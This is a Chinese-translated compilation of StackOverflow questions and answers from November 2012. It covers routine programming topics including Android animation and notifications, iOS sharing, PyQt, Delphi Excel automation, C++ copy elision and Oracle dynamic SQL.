# StackOverflow 问答 13287000-13287999

# android - 逐帧动画 API 兼容性

> ID：13287003
> 
> 赞同：1
> 
> 时间：2012-11-08T10:17:38.453
> 
> 标签：android

我正在使用以下代码来设置逐帧动画：

```
 public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

        setContentView(R.layout.splash);

        final ImageView back = (ImageView) findViewById(R.id.splash_image);
        back.setBackgroundResource(R.drawable.splash_animation);

        AnimationDrawable frameAnimation = (AnimationDrawable) back.getBackground();

         // Start the animation (looped playback by default).
         frameAnimation.setExitFadeDuration(2000);
         frameAnimation.start();
} 
```

但是，`setExitFadeDuration`只有在 API 级别 11 之后才有效。我用来使动画与 API 7 以后兼容的代码是否有替代方法

# firefox - 如何将浏览器的书签导入谷歌书签

> ID：13287004
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:17:39.343
> 
> 标签：firefox, google-chrome

我在浏览器中保存了很多书签。我希望这些可以通过使用谷歌书签在线获得。我可以将它们一一添加到谷歌书签中，但我想将它们导入 bult。这可能吗？（来自浏览器 google-chrome 和 firefox）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T05:41:57.147

据[谷歌](https://support.google.com/bookmarks//answer/178166?hl=en)称，批量导入谷歌书签的唯一方法是使用谷歌工具栏扩展。

Chrome/Firefox 都允许您导出到 html 文件，然后使用它导入到 Firefox 中，然后导入到 Google 书签中。

笨拙但有效。

# objective-c - 社会行动表（如在 iOS 6 上）

> ID：13287007
> 
> 赞同：31
> 
> 时间：2012-11-08T10:17:45.670
> 
> 标签：objective-c, ios, xcode, uiactionsheet, sharing

在 iOS 6 上，一个变化是当你想分享一些东西时，它会显示一个类似于下面的操作表：

![](../Images/a047bc80cbe45aaf9a3a48e7a7d0fc7a.png)

我见过其他一些使用此功能的应用程序，是否有本地方法可以在不制作自定义操作表的情况下执行此操作？

谢谢！

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2012-11-08T10:34:48.663

```
 NSString *textToShare = @"your text";
    UIImage *imageToShare = [UIImage imageNamed:@"yourImage.png"];
    NSArray *itemsToShare = @[textToShare, imageToShare];
    UIActivityViewController *activityVC = [[UIActivityViewController alloc] initWithActivityItems:itemsToShare applicationActivities:nil];
    activityVC.excludedActivityTypes = @[UIActivityTypePrint, UIActivityTypeCopyToPasteboard, UIActivityTypeAssignToContact, UIActivityTypeSaveToCameraRoll]; //or whichever you don't need
    [self presentViewController:activityVC animated:YES completion:nil]; 
```

请参阅 UIActivityViewController 文档：[https ://developer.apple.com/documentation/uikit/uiactivityviewcontroller](https://developer.apple.com/documentation/uikit/uiactivityviewcontroller)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T10:22:55.890

它实际上是一个自定义操作表，您也可以轻松创建它。除此之外，您可能还想查看这个共享工具包框架。

[https://github.com/ShareKit/ShareKit](https://github.com/ShareKit/ShareKit)

# security - Java 7 安全问题信息

> ID：13287011
> 
> 赞同：1
> 
> 时间：2012-11-08T10:18:01.450
> 
> 标签：security, java-7

对于这样的问题，可能不是正确的平台，但有谁知道在哪里（或是否）可以找到有关当前 Java 7 SE 安全问题的详细信息，比如[这些](http://www.security-explorations.com/en/SE-2012-01-poc.html)？

我想这些都没有发布，因为这基本上会记录如何利用这些漏洞，但我只是想我会问一下，如果在某个地方你可以获得更多关于*“完全绕过 Java 安全沙箱”*的信息。我找到了[Alex Millers 博客](http://tech.puredanger.com/java7/)，但它似乎已经有几年没有更新了。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:29:40.623

当安全研究人员负责（并且生产公司不会坐视各自的驴太久）时，PoC 通常只有在软件的固定版本发布并在一定程度上得到广泛传播时才会发布。

如果您的兴趣是研究，那么较旧的、已经发布的漏洞应该提供大量的研究内容。

如果您的兴趣是积极利用这些漏洞，那么不要指望我（或此站点上的任何其他人，我希望）提供任何帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T15:48:55.800

根据我的经验，与使用旧版本相比，迁移到最新版本的安全风险通常较小。原因是安全研究人员通常很快就会跳到最新版本来指出问题。通常这些问题会很快得到解决。而开发人员很少回到旧版本，除非问题真的很普遍，并且他们可以编写一个不会破坏很多应用程序的解决方案。

现实情况是，我们这些凡人并不了解突出的安全问题，原因有两个。

首先是公司不想发布尚未解决的问题。第二个是黑帽黑客对发布他们知道的问题的兴趣为零。

坦率地说，即使是 Oracle 也不知道 Java 6 上所有突出的安全问题。他们只知道好人告诉他们的那些问题，而且他们永远不会公开发布给我们，直到他们知道为它发布了一个补丁。即使这样，补丁描述也往往会混淆他们正在修复的确切内容。

如果我是一名安全审计员，我会尝试将自己插入那些讨论黑客攻击 java 以获得乐趣和利润的论坛和网站，并简单地观察所发生的事情。

# c++ - Python、PyQt 和 C++ 库

> ID：13287019
> 
> 赞同：3
> 
> 时间：2012-11-08T10:18:24.677
> 
> 标签：c++, pyqt

我用 SIP 制作了一个 c++ 库，以便在 Python 代码中使用它。

我的问题是我无法将 python QString 对象传递给 C++ 库函数。每次使用 QString 调用 C++ 函数都会导致 Python 崩溃。执行函数时不会出现崩溃，但在开始函数的第一步之前。（所以我这里就不放cpp文件了）

这是我所做的：

*C++ 类：*

```
#include "QString"

Class CPythInteface
{
 public:
  CPythInteface ();

  // Trying a lot of prototypes:`
  bool testSET( const QString* cSource);
  bool testGET( QString* Source );
  bool testGET2( QString& Source );
  bool testGET3( char* zBuff );
  bool testGET4( QString Source );
  bool testSET4( QString Source );
  QString getS1( const char* zVal );
}; 
```

-

*sip文件：*

```
%Module libtest 1
%Import QtCore/QtCoremod.sip

class CPythInteface
{

%TypeHeaderCode
#include "CPythInteface.h"
%End  

 public:

  CPythInteface ();

  bool testSET( const QString* );
  bool testGET( QString*  );
  bool testGET2( QString&  );
  bool testGET3( char*  );
  bool testGET4( QString Source );
  bool testSET4( QString Source );

  QString getS1( const char* zVal ); 
}; 
```

-

*Python 用法：*

```
>>> import libtest
>>> obj = libtest. CPythInteface()
>>> from PyQt4 import QtCore
>>> qs1 = QtCore.QString( "abc" )
>>> obj.testGET3( "azertyuiop" )        <-- OK
>>> obj.testXXX( qs1 )              <-- Crashes for all 
                                       functions SET/GET 
```

.

难道我做错了什么 ？这不是应该使用 Python 和 C++ 的方式吗？

-

上面初始化的另一个测试：

```
>>> qs1 += obj.getS1( "azert" ) 
```

给出错误：

**TypeError：无法连接“QString”和“ProcessError”对象**

这似乎表明 Python 没有正确理解 C++ 库中的 QString。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-28T12:45:42.183

如果有人对此感兴趣，我发现问题肯定是因为 PyQt 提供了 Qt 4.9.2（这不是公共版本），尽管我的 C++ 库链接了 Qt 4.6.3。

# python - Python 使用 XLRD、XLWT 和 XLUTILS 复制整个工作簿

> ID：13287021
> 
> 赞同：1
> 
> 时间：2012-11-08T10:18:31.197
> 
> 标签：python, xlrd, xlwt, xlutils

我只是想复制整个工作簿。稍后要添加一些信息，我可以毫不费力地找到如何将信息添加到单个单元格等...但是我还没有找到复制整个工作表的方法。也许我过于复杂了，但任何输入都是值得赞赏的。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:51:43.070

```
wb = xlwt.Workbook(encoding='utf-8')
ws = wb.add_sheet('Sheet1')
ws.write() you can add data to your worksheet like this 
```

# linux - 来自 PC 生态系统的海量计算能力

> ID：13287022
> 
> 赞同：0
> 
> 时间：2012-11-08T10:18:31.320
> 
> 标签：linux, parallel-processing, hpc

我正在研究如何建立一个笔记本电脑生态系统来结合计算能力。这与 HPC 非常相似，但在概念上有所不同。

我希望能够将来自互连的计算机的处理器和内存结合起来，可能通过 LAN 或 Internet。这个想法是用户可能愿意将计算能力作为一项免费服务贡献出来（就像用户在种子上贡献种子一样）。这样我就可以启动一项工作，并且该工作分配给贡献的资源。用户应该能够根据自己的选择加入或离开生态系统。

我调查了以下内容：

Rocks 等典型的集群软件：我不想强迫用户安装操作系统。

[Openmosix](http://en.wikipedia.org/wiki/OpenMosix)：非常接近我想要的，但支持已停止。[LinuxPMI](http://en.wikipedia.org/wiki/LinuxPMI)项目似乎更接近，但开发缓慢且文档稀缺。无论如何，我正在尝试这个，我很快就会发布我的发现。我想知道你在这方面的经验。

OpenSSI/Kerrighed：目前对我来说不是很满意。

如果有任何现有的开源项目需要考虑，请告诉我您的想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:28:56.600

调查这些项目[BOINC](http://boinc.berkeley.edu) , [Condor](http://research.cs.wisc.edu/condor/)

# events - 使用 OleVariant 识别 onclose 事件？

> ID：13287025
> 
> 赞同：2
> 
> 时间：2012-11-08T10:18:40.323
> 
> 标签：events, ole, office-2007, delphi-5, office-2003

我正在使用带有 Excel 的 OleAutomation **:= CreateOleObject('Excel.Application');** 使用**Excel.Replace**和**Excel.SaveAs**功能。这些功能在我的问题中是必不可少的，我不能忽略它们。另一方面，我必须使用**没有 OnCloseEvent的****OleVariant**类型。现在我的问题开始了：

 *** * *

首先是一个小概述：

```
**procedure OpenExcel begins**

Excel := CreateOleObject('Excel.Application'); 
//Excel opens a template and replaces placeholders 

**procedure OpenExcel end**; 
```

现在 Excel 已打开，所有占位符都已替换。在此程序之后，客户可以更改他的表格，纠正错误，...... 他想要关闭 Excel 或保存工作簿。

* * *

**我的问题从这里开始：**我想**抓住****客户关闭 Excel**的那一刻。如果他的文档被保存，在 OleObject 被销毁之前，所有数据（路径或颜色之类的字符串和对象中的 id 之类的整数）都将提交给另一个名为 ELO（文档存档）的程序。但是 OleObjects 无法识别关闭或其他任何东西。

* * *

### 有解决此问题的解决方法吗？也许将对象链接到 OleObject 或进程本身以确定客户端何时关闭 Excel？

我查找了 \Ocx\Servers\excel200.pas 是否提供了一种方法，但我没有找到任何东西。我的同事建议我查看 office 文件夹并搜索 excel .tlb 文件，但它不存在。

* * *

如果上述问题无法解决

* * *

如果这不可能，有谁知道我如何将**Excel.Replace**和**Excel.SaveAs**与具有 OnClose 事件的对象一起使用？

我当前的**替换**代码如下：

```
//for all sheets in the workbook
for iSheet := 1 to Excel.Worksheets.Count do
begin

  //activate the sheet
  Excel.Worksheets[iSheet].Activate;

  // this will be..
  sWhat := %First String%;  
  //..replaced by..
  sReplacement := %Second String%;

  // warnings off (override message or if excel didn't find a sWhat)
  Excel.Application.DisplayAlerts := False;

  Excel.Cells.Replace(
    What          := sWhat,
    Replacement   := sReplacement,
    LookAt        := xlWhole,
    SearchOrder   := xlByRows,
    MatchCase     := False,
    SearchFormat  := False,
    ReplaceFormat := False
  );

  //warnings on
  Excel.Application.DisplayAlerts := True;
end; 
```

**SaveAs 方法**类似。它只是发送一个命令，excel 本身可以像**Excel.Cells.Replace**一样处理。

我希望对我的问题的描述足够清楚，我的英语没有我想要的那么好..

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:00:13.590

我只是想告诉你，我没有用后期绑定解决这个问题，而是用早期绑定解决了这个问题。

对于遇到相同问题的每个人，这里有一个可能的解决方案：

```
uses excel97, excel2000 //order is important
..
var
  ExcelApp : TExcelApplication;
  ExcelWb: _WorkBook;
  ExcelSt: _WorkSheet;
  iLCID: Integer; 
```

* * *

## 打开 Excel，加载文件，激活工作表并连接到 OnWorkbookBeforeClose 方法

```
 // open excel
  iLCID := GetUserDefaultLCID;

  // create and connect excelapplication
  ExcelApp := TExcelApplication.Create(self);
  ExcelApp.Connect;

  // load file
  ExcelWb := ExcelApp.Workbooks.Open(
    ExtractFilePath(ParamStr(0))+'test.xlsx',
    emptyParam, emptyParam, emptyParam, emptyParam,
    emptyParam, emptyParam, emptyParam, emptyParam,
    emptyParam, emptyParam, emptyParam, emptyParam,
    iLCID
  );

  // Visible - off
  ExcelApp.Application.Visible[0] := false;

  // Starts excel on the first sheet
  ExcelSt := ExcelWb.Sheets[1] as _WorkSheet;
  ExcelSt.Activate(iLCID);

  // Visible - on
  ExcelApp.Application.Visible[0] := true;

  // Connect to the closemethod
  ExcelApp.OnWorkbookBeforeClose := WorkbookBeforeClose; 
```

* * *

## 替换一些东西

```
var
  sWhat, sReplacement : String;
  iSheets : Integer;
begin

  // basic data
  sWhat := **STRING 1**;
  sReplacement := **STRING 2**;

  // Warnings off (Overridewarning)
  ExcelApp.Application.DisplayAlerts[iLCID] := False;

  // Replace for all sheets in a workbook
  for iSheets := 1 to ExcelApp.Application.Sheets.Get_Count do
  begin
    ExcelSt := ExcelWb.Sheets[iSheets] as _WorkSheet;
    ExcelSt.Activate(iLCID);

    ExcelApp.Application.ActiveWorkbook.Application.Cells.Replace(
      {What} sWhat,
      {Replacement} sReplacement,
      {LookAt} xlWhole,
      {SearchOrder} xlByRows,
      {MatchCase} False,
      {MatchByte} False
      );

   end;

  // warnings on
  ExcelApp.Application.DisplayAlerts[iLCID] := True; 
```

* * *

## 保存您的工作

```
var
  oFileName, oFileFormat : OleVariant;
begin

  {
  Value = Constant in excel (Description)
  ------------------------------------------------------------------------------
  50   = xlExcel12 (Excel Binary Workbook 2007+ with or without macros, xlsb)
  51   = xlOpenXMLWorkbook (without macros Excel 2007+, xlsx)
  52   = xlOpenXMLWorkbookMacroEnabled (with or without macros Excel 2007+, xlsm)
  56   = xlExcel8 (97-2003 Format in Excel 2007-2010, xls)
         !!! in 2003 = xlNormal !!! 
  ------------------------------------------------------------------------------
  }

  oFileName   := 'Filename';
  oFileFormat := 50;
  iLCID       := GetUserDefaultLCID;

  ExcelApp.Application.ActiveWorkbook.SaveAs(
    {Filename} oFileName,
    {FileFormat} oFileFormat,
    {Password} emptyParam,
    {WriteResPassword} emptyParam,
    {ReadOnlyRecommended} false,
    {CreateBackup} false,
    {AccessMode} 0,
    {ConflictResolution} false,
    {AddToMru} false,
    {TextCodepage} false,
    {TextVisualLayout} false,
    {LCID} iLCID
    ); 
```

* * *

## 之前关闭方法

```
 procedure WorkbookBeforeClose(Sender: TObject;
   var Wb, Cancel: OleVariant);
 var
   oTrue :OleVariant;
 begin

   ExcelApp.Application.Visible[0] := false;

   //Here comes your stuff when the user wants to quit excel

   oTrue := true;
   Cancel := oTrue;

   ExcelApp.Quit;
 end; 
```

### 我希望这会帮助一些遇到类似问题的人:)**

# python - 在python中的图像上发送文本到打印机

> ID：13287028
> 
> 赞同：4
> 
> 时间：2012-11-08T10:19:09.840
> 
> 标签：python, pywin32

在 windows 系统中使用 python、wxpython 和 sqlite。我正在尝试打印一些证书/文凭/卡片，背景中有图像，上面有人名/文本。

我知道使用 Pywin32 中的 win32print 打印文本的基本步骤，但是：

1.  我不知道如何添加图像并将其设置为背景。

    ```
    while .....

        .....

        # Query sqlite rows and collumn name and set the self.text for each certificate

        .....

        # Now send to printer

        DC = win32ui.CreateDC()
        DC.CreatePrinterDC(win32print.GetDefaultPrinter())

        DC.SetMapMode(win32con.MM_TWIPS)

        DC.StartDoc("Certificates Job")

        DC.StartPage()

        ux = 1000
        uy = -1000
        lx = 5500
        ly = -55000

        DC.DrawText(self.text, (ux, uy, lx, ly),win32con.DT_LEFT)

        DC.EndPage()
        DC.EndDoc() 
    ```

    此打印机代码在一个 while 循环中，根据检查条件从 sqlite 数据库中调用每个人的姓名。

2.  数据库的所有名称都打印在同一页上。如何命令打印机从数据库中为每个名称吐出 1 页？

3.  欢迎使用更简单的方法或模块来处理打印机（纸张和/或 pdf）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:53:27.080

我认为使用 WxPython 是可行的，但我知道的不足以帮助你。

但是，您可以尝试查看[Python Image Library](http://www.pythonware.com/products/pil/)：

示例代码：

```
import sys
from PIL import Image,ImageDraw

txt = 'C\'est mon texte!'
txt2 = '??,??!'

im = Image.new("RGBA",(300,200),(100,155,100))

draw = ImageDraw.Draw(im)

draw.text( (0,50), txt )
draw.text( (0,100), txt2)
del draw

im.save('font.png', "PNG") 
```

结果：

![在此处输入图像描述](../Images/bd5e9cb4e964a89ea8e978c863b6928b.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T12:04:35.683

I suggest you instead use [reportlab](http://www.reportlab.com/software/opensource/rl-toolkit/) to create a PDF and then send that PDF to a printer using gsprint.

See this answer: [https://stackoverflow.com/a/4498956/3571](https://stackoverflow.com/a/4498956/3571)

# asp.net - 将 GridView 绑定到 ASP.Net Web 应用程序中的 ObservableCollection

> ID：13287032
> 
> 赞同：1
> 
> 时间：2012-11-08T10:19:23.887
> 
> 标签：asp.net, data-binding, gridview, datasource, observablecollection

我正在开发我的第一个 ASP.Net Web 应用程序，我学到了很多东西，但是我有一个我无法弄清楚的问题。

我有一个带有集合作为数据源的 GridView，如果我将 GridView 绑定到集合，它可以正常工作：

```
List<string> l = new List<string>();
l.Add("hello");
l.Add("world");

GridView1.DataSource = l;
GridView1.DataBind(); 
```

但问题是，当我向列表中添加一个新项目时，它没有显示在网格中，我已经读到这是正常的，在执行 GridView1.DataBind(); 后会发生变化；不会添加到网格中。

我做了一些研究，发现我可以使用 ObservableCollection 来做到这一点，如果将 ObservableCollection 绑定到 GridView 并添加新项目，则更改也应该发生在 GridView 中。我已经这样做了：

```
ObservableCollection<string> o = new ObservableCollection<string>();
o.Add("hello");
o.Add("world");

GridView1.DataSource = o;
GridView1.DataBind(); 
```

当我运行应用程序时它工作正常，显示数据，但我添加了一个按钮，并在点击事件中，我向 ObservableCollection 添加了一个新元素，但它没有出现在网格中，我没有知道为什么。

```
protected void Button1_Click(object sender, EventArgs e)
{
     o.Add("test");
} 
```

希望有人可以帮助我。

谢谢！！

# c++ - 构造函数的链式调用中的复制省略

> ID：13287033
> 
> 赞同：1
> 
> 时间：2012-11-08T10:19:30.153
> 
> 标签：c++, constructor, copy-elision

由于复制省略，通常首选[按值传递对象](http://cpp-next.com/archive/2009/08/want-speed-pass-by-value/)，只要保留内部副本即可。以下情况怎么办：

```
struct A
{
    A(int x, int y) : x(x), y(y) {}
    int x, y;
};

struct B
{
    B(A a) : a(a) {}                // 1
    B(const A& a) : a(a) {}         // 2
    A a;
};

struct C : A
{
    C(A a) : A(a) {}                // 3
    C(const A& a) : A(a) {}         // 4
};

struct D : B, C
{
    D(A a) : B(a), C(a) {}          // 5
    D(const A& a) : B(a), C(a) {}   // 6
}; 
```

链接的副本是否仍会被省略，即 1、3 和 5 更可取吗？或者更确切地说是2、4、6？它依赖于内联吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:33:07.810

在您的示例中，我认为这没有太大区别。的构造函数`A`没有副作用，因此标准的复制省略规则无关紧要。重要的是优化器可以实际实现的目标。一旦构造函数被内联，我希望在这两种情况下都差不多，并且没有什么特别的原因不能内联这个构造函数（它很小并且在类定义中定义）。

如果`B`构造函数不能内联或`A`构造函数有副作用，则必须复制到数据成员（对于 和 中的基类子对象`C`也是如此`D`）。标准的复制省略规则不允许从参数到数据成员的复制被省略，因此实际上您会看到不需要的副本。

假设该类型`A`有一个比复制更有效的移动构造函数，在调用者传递一个临时对象的情况下，以下是明显的胜利：

```
struct B
{
    B(A a) : a(std::move(a)) {}
    A a;
}; 
```

原因是这样可以直接将临时构造到函数参数中，然后将其移动到数据成员中。2/4/6 不能（安全地）从左值引用移动到数据成员中。1/3/5 可以安全地移动，因为该参数`a`不再使用，但编译器不允许自己进行更改，除非（a）您授予它权限`std::move`，或者（b）它们在“好像”规则。

在调用者传递左值的情况下，我的构造函数可能比（2）稍微慢一些，因为我的构造函数复制然后移动，而（2）只是复制。您可以忽略此成本（因为移动应该非常便宜），或者您可以编写单独`const A&`的`A&&`构造函数。我希望一般的经验法则是做前者。

# xaml - 在 wp7 中将 ApplicationBarIconButton 的可见性设置为 false

> ID：13287034
> 
> 赞同：0
> 
> 时间：2012-11-08T10:19:30.260
> 
> 标签：xaml, windows-phone-7.1, windows-phone

我的 Windows Phone 应用程序中有一个应用程序栏

```
 <phone:PhoneApplicationPage.ApplicationBar>
    <shell:ApplicationBar>
        <shell:ApplicationBarIconButton x:Name="Refresh" IconUri="Images/appbar.sync.rest.png" Text="Actualiser" Click="ApplicationBarIconButton_Click" />
        <shell:ApplicationBarIconButton x:Name="Favorite"  IconUri="Images/appbar.favs.addto.rest.png" Text="Favorite" Click="ApplicationBarIconButton_Click_1" />
    </shell:ApplicationBar>
</phone:PhoneApplicationPage.ApplicationBar> 
```

当我点击时，我需要将可见性设置`<shell:ApplicationBarIconButton x:Name="Favorite" IconUri="Images/appbar.favs.addto.rest.png" Text="Favorite" Click="ApplicationBarIconButton_Click_1" />` 为 false

怎么能这样？？

此致

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T10:54:46.153

您不能将应用栏中单个按钮的可见性设置为折叠状态。但是您可以`enable/disable`通过使用`IsEnabled`属性或从后面的代码中动态删除它们`ApplicationBar.Buttons.Remove(object)`并传递您在单击事件时收到的按钮对象。我想它应该工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T23:33:19.027

您需要做的是在您的应用程序中有 2 个不同的 AppBars - 第一个带有 2 `ApplicationBarIconButtons`（刷新和收藏），第二个只有 Refresh `ApplicationBarIconButton`。

在您的`EventHandler`for 中`ApplicationBarIconButton_Click_1`，您可以更改`AppBar`当前向用户显示的内容。

像这样的工作...

```
ApplicationBar appBar1 = new ApplicationBar();
ApplicationBarIconButton refreshIcon = new ApplicationBarIconButton();
refreshIcon.text = "Refresh";
refreshIcon.Click += new EventHandler(Refresh_Click);
appBar1.add(refreshIcon);

ApplicationBarIconButton favIcon = new ApplicationBarIconButton();
favIcon.text = "Refresh";
favIcon.Click += new EventHandler(Fav_Click);
appBar1.add(favIcon);

ApplicationBar appBar2 = new ApplicationBar();
ApplicationBarIconButton refreshIcon2 = new ApplicationBarIconButton();
refreshIcon2.text = "Refresh";
refreshIcon2.Click += new EventHandler(Refresh_Click);
appBar2.add(refreshIcon2);

ApplicationBar = appBar1; // Assign the AppBar with both buttons as the default. 
```

然后在`EventHandler`for 中`Fav_Click`，写

```
ApplicationBar = appBar2; // This will make the AppBar with only "Refresh" button visible giving the impression that the Favorite button has been made invisible. 
```

# oracle - Oracle PL/SQL 变量记录字段名称

> ID：13287038
> 
> 赞同：3
> 
> 时间：2012-11-08T10:19:49.847
> 
> 标签：oracle, variables, plsql, record

我对游标中的动态字段名称有疑问。这有点难以解释，但我会尝试......

有3张表：

> 1.  T_IN：我对这张桌子一无所知。没有结构，没有字段名，什么都没有。
>     
>     
> 2.  T_OUT：这是目标表
>     
>     
> 3.  T_KONF：此表有 2 列：
>     
>     
>     
>     C_IN VarChar2：此列包含表 T_IN 的字段名称
>     
>     
>     
>     C_OUT VarChar2：此列包含表 T_OUT 的字段名称

表 T_KONF 告诉我，表 T_IN 的哪个字段中的哪些数据必须进入表 T_OUT 的哪个字段。

现在我有记录

```
MyRec C_OUT%ROWTYPE; 
```

和一个带有字段名的变量

```
field_name VarChar2(15) := 'PRODUCT'; 
```

如何将记录的此字段设置为一个值？硬编码它看起来像这样：

```
MyRec.PRODUCT := value; 
```

但是有没有办法动态地做到这一点？

```
MyRec.[field_name] := value; -- ??? 
```

我希望这足够具体......谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:51:21.123

您不能动态分配记录字段。

您可以使用[INDEX-BY PL/SQL 表（关联数组）](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/composites.htm#CHDEIDIC)，但必须事先知道其类型。您可以使用包含所有专业类型的动态 RECORD，并且可以在运行时决定使用哪个字段（VARCHAR2、DATE...），但这会相当乏味。

相反，我建议您使用动态 SQL，因为您在运行时知道所有列名，并且我们可以假设列类型是兼容的。

像这样的东西应该可以工作（11gR2）：

```
-- SETUP
-- CREATE TABLE T_KONF(C_IN VARCHAR2(30), C_OUT VARCHAR2(30));
-- INSERT INTO T_KONF VALUES ('C1', 'C2');
-- INSERT INTO T_KONF VALUES ('C2', 'C3');

SQL> DECLARE
  2     l_sql LONG;
  3  BEGIN
  4     SELECT 'INSERT INTO t_out (' ||
  5               listagg(dbms_assert.simple_sql_name('"'||t_konf.c_out||'"'),
  6                      ', ') WITHIN GROUP (ORDER BY t_konf.rowid)
  7            || ' )
  8             SELECT ' ||
  9               listagg(dbms_assert.simple_sql_name('"'||t_konf.c_in||'"'),
 10                       ', ') WITHIN GROUP (ORDER BY t_konf.rowid)
 11            || '
 12               FROM t_in
 13              WHERE 1 = 1' -- custom where clause
 14       INTO l_sql
 15       FROM t_konf;
 16     DBMS_OUTPUT.put_line(l_sql);
 17     -- EXECUTE IMMEDIATE (l_sql); -- uncomment when SQL is OK
 18  END;
 19  /

INSERT INTO t_out ("C3", "C2" )
           SELECT "C2", "C1"
             FROM t_in
            WHERE 1 = 1 
```

# javascript - 如何使用 FileResult 但“仅”通过 $ajax 请求下载文件 PDF？

> ID：13287043
> 
> 赞同：0
> 
> 时间：2012-11-08T10:20:12.100
> 
> 标签：javascript, jquery, ajax, asp.net-mvc-3, fileresult

这是网络方法定义：

```
[HttpPost]
public FileResult GenerateReport(string Id) {
     //............Code .................//
 return File(response.ReportContents, "application/pdf");

} 
```

这是我对 Web 方法的 jQuery ajax 调用：

```
$(".ValuationReport").bind('click', function () {
        $.ajax({
            url: "https://localhost.com/Report/GenerateReport
            type: "POST",
            data: { Id: "00AFCA2F-6809-4FF4-BA32-125EAEBB1321" },
            success: function (data) {

            },
            error: function () {
                alert("error");
            }
        });
    }); 
```

请帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:34:03.647

您没有提到您当前方法真正面临的问题，因为您无法使用 XMLHTTPRequest 下载文件，使用当前方法，下载对话框应该显示为对您的 ajax 请求的响应，因为浏览器将无法理解`"application/pdf"`ContentType 并会尝试下载文件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:11:19.613

您不能使用 ajax 请求下载文件。

# calendar - magento 将日历日期选择器添加到管理中的自定义表单（自定义模块）

> ID：13287046
> 
> 赞同：5
> 
> 时间：2012-11-08T10:20:21.640
> 
> 标签：calendar, magento

我已经从 - Modulecreator 创建了自定义模块。
现在我想在我的自定义表单中添加日历日期选择器字段 -（在管理端）。
喜欢`From date` `To date`。

从日期选择器中选择的值应在提交时添加到数据库中。
谢谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-08T11:03:20.913

```
$fieldset->addField('date', 'date', array(
    'name'               => 'date',
    'label'              => Mage::helper('your_module_name')->__('Date'),
    'after_element_html' => '<small>Comments</small>',
    'tabindex'           => 1,
    'image'              => $this->getSkinUrl('images/grid-cal.gif'),
    'format'             => Mage::app()->getLocale()->getDateFormat(Mage_Core_Model_Locale::FORMAT_TYPE_SHORT) ,
    'value'              => date( Mage::app()->getLocale()->getDateStrFormat(Mage_Core_Model_Locale::FORMAT_TYPE_SHORT),
                                  strtotime('next weekday') )
)); 
```

# objective-c - iPhone 5 图像的命名约定？

> ID：13287047
> 
> 赞同：1
> 
> 时间：2012-11-08T10:20:25.600
> 
> 标签：objective-c

我正在开发适用于 iPhone 5 及更低版本的应用程序。

对于我正在使用此代码的图像

```
CGRect mainFrame = [[UIScreen mainScreen] bounds];

int imgIndex = arc4random() % 10 + 1;

if(mainFrame.size.height > 480)
    [pBackgroundImageView setImage:[UIImage imageNamed:[NSString stringWithFormat:@"dreams 1136x640 %d.jpg",imgIndex]]];
else
    [pBackgroundImageView setImage:[UIImage imageNamed:[NSString stringWithFormat:@"dreams_960x640_%d.jpg",imgIndex]]]; 
```

但我对此并不满意。

iphone 5图像有什么特定的命名约定吗？

提前感谢马诺

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T10:46:39.133

`Default-568h@2x.png`这将是您需要的启动图像，您需要添加`-568h@2x`到所有 iPhone 5 图像的末尾，但命名约定存在问题。

我发现这样做有帮助。

```
 [pBackgroundImageView setImage:[UIImage imageNamed:(IS_PHONE5()) ? @"myimage-568h@2x.png" : @"myimage.png"]]; 
```

问题是它没有拿起，`-568h@2x`但这是它应该的方式。获取`IS_PHONE5`变量添加

```
 #define IS_PHONE5() ([UIScreen mainScreen].bounds.size.height == 568.0f && [UIScreen mainScreen].scale == 2.f && UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) 
```

认为这可能有助于任何想支持高分辨率手机和 iPhone 5 的人

[支持高分辨率和iPhone 5](http://developer.apple.com/library/ios/#documentation/2DDrawing/Conceptual/DrawingPrintingiOS/SupportingHiResScreensInViews/SupportingHiResScreensInViews.html#//apple_ref/doc/uid/TP40010156-CH15-SW1)

# android - android不可点击通知

> ID：13287049
> 
> 赞同：0
> 
> 时间：2012-11-08T10:20:28.183
> 
> 标签：android, notifications

我想答案很简单，但我还是没找到。我需要的是设置一个通知（如果用户愿意）是不可点击的（或不可扩展的或任何可以调用的），就像在图片中看到的那样。我该怎么做？我认为将 boolean Ongoing 设置为 false 将是答案，但我错了..

![通知](../Images/625dc01236264a0073fdb9d1c3c5f171.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T15:29:37.910

您可以使用前台服务来做到这一点。

```
final NotificationCompat.Builder noti = new NotificationCompat.Builder(context);
noti.setTicker("");
noti.setContentTitle("");
noti.setContentText("");
noti.setWhen(System.currentTimeMillis());
noti.setOngoing(true);
service.startForeground(11, noti.build()); 
```

我使用的上下文是服务本身。“11”是应用程序中必须唯一的通知ID（我认为）。Notification.Builder 类来自 api 级别 11，但支持库中的类来自 api 4。（NotificationCompat.Builder）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:46:53.503

对不起，你不能那样做。每个都`Notification`必须有一个可扩展的视图（即使它是空的）。这将为用户提供一种取消通知的方法。

